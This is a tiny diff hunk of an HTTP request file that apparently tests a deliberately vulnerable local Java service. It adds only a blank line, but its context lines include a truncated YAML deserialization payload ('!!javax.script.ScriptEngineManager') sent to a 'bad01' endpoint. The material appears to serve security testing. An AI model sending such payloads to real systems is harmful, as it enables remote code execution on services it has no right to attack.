@@ -22,3 +22,4 @@ GET http://localhost:80/api/yaml/bad01?payload=!!javax.script.ScriptEngineManage
 
 ###
 GET http://localhost:80/api/scriptengine/bad01?payload=xx
+
